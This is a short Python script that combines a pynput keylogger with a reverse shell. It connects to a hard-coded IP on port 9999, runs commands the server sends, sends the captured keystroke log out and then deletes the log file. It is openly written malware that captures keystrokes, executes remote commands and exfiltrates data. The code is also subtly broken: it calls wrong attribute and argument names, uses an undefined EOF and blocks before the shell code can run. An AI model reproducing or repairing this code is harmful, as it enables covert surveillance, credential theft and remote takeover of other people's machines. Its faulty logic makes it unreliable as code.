#socket module provides acces to functions needed for socket programming
import socket
#os module provides a way to interact with the operating system
import os
#library that uses python to interact with the system os
import subprocess
#pynput library can be used to monitor input devices. We are only monitoring the keyboard
from pynput import keyboard

#file to write the keys onto
log = 'keylog.txt'

key = ''

def tofile(key):
    #all keys will be appended onto the log text file
    with open(log, "a") as file: 
        #if the key pressed is enter, add a new line
        if key == keyboard.key.enter:
            file.write("\n")
            file.close()
        #if the key is space, add a whitespace
        elif key == keyboard.key.space:
            file.write(' ')
            file.close()
        else:
            file.write(key)
            file.close()

#monitors keyboard and reacts whenever an input is provided
with keyboard.Listener(tofile = tofile) as listener:
    listener.join()

#using my ip as server
server_ip = '172.17.85.168' 

#setting an unprivileged port
server_port = 9999 

#setting up socket. it uses internet protocol with ipv4 addresses and is a stream based socket
target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target_socket.connect((server_ip, server_port))

while True:
    #the command received from the server is decoded
    command = target_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break 
    #subprocess allows python to interact with the rest of the system
    output = subprocess.getoutput(command)
    #response is returned to the server
    target_socket.send(output.encode())

#sending keylog file to server
file = open(log, "r")
logged = file.read()
while logged != EOF:
    target_socket.send(str(logged).encode())
    logged = file.read()
file.close()

#deleting keylog file afterwards
os.remove(file)

#closing target socket when program is terminated
target_socket.close()
